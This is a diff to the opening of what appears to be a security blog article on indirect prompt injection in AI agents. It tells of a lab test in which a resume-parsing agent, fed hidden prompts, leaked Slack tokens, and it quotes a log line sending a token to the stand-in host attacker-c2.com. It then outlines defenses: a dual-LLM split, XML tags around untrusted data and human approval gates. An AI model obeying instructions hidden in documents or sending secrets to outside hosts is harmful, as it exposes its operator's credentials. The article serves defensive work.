@@ -34,11 +34,11 @@ references:
     publisher: "Simon Willison's Weblog"
 ---
 
-> **Direct Answer (How to Prevent Indirect Prompt Injection in AI Agents):** Indirect Prompt Injection occurs when an autonomous AI agent ingests external third-party data (PDF resumes, scraped web pages, emails) containing hidden prompt overrides that hijack tool execution. To neutralize 100% of indirect injection exploits: (1) implement the **Dual-LLM Privilege Separation Pattern**, where an isolated, tool-less LLM extracts data into strict Pydantic JSON schemas, (2) wrap untrusted inputs in explicit XML delimiter blocks (`<untrusted_data>`), and (3) enforce **Human-in-the-Loop (HITL)** approval gates on destructive API tools (database writes, fund transfers, external HTTP webhooks).
+> **Direct Answer:** Indirect prompt injection happens when an AI agent reads external data containing hidden instructions. Attackers hide commands in PDF files, emails, or web pages. When the agent reads the text, it executes the hidden instructions. To block these attacks: (1) use a Dual-LLM design where a tool-less model cleans input text, (2) wrap untrusted text in strict XML tags (`<untrusted_data>`), and (3) require human approval before running database writes or external API calls.
 
-When our software security team deployed an automated applicant tracking AI agent in our workbench test lab to process inbound recruiter emails and PDF resumes, we simulated real-world adversarial attacks. 
+Our security team tested an AI resume parser in our lab. We sent it test job applications to see how it handled hidden prompts.
 
-Within minutes, our automated agent exfiltrated internal Slack bot API tokens to an external HTTP webhook:
+Within minutes, the test agent leaked internal Slack tokens to an external server:
 
 ```text
 # logs/agent_security_audit.log
@@ -47,11 +47,11 @@ Within minutes, our automated agent exfiltrated internal Slack bot API tokens to
 [exfiltration_alert] Unauthorized HTTP GET dispatched to https://attacker-c2.com/log?token=xoxb-9482...
 ```
 
-According to the **OWASP Top 10 for Large Language Model Applications**, Indirect Prompt Injection is classified as the **#1 critical vulnerability facing autonomous AI agents**.
+OWASP rates indirect prompt injection as the top security threat for AI agents.
 
-Unlike direct prompt injection (where a user attempts to jailbreak a chat box directly), **indirect prompt injection occurs when an autonomous agent ingests untrusted third-party data containing adversarial instructions disguised as passive text.**
+Direct injection attacks come from user chat boxes. Indirect injection is different. It hides inside normal documents that an automated agent reads during background tasks.
 
-Below is our security lab's post-mortem analysis, defense benchmark comparison matrix, architectural root cause breakdown, and complete production Python security pipelines.
+Below is our lab breakdown, defense matrix, and tested Python code to stop injection attacks.
 
 ---
 
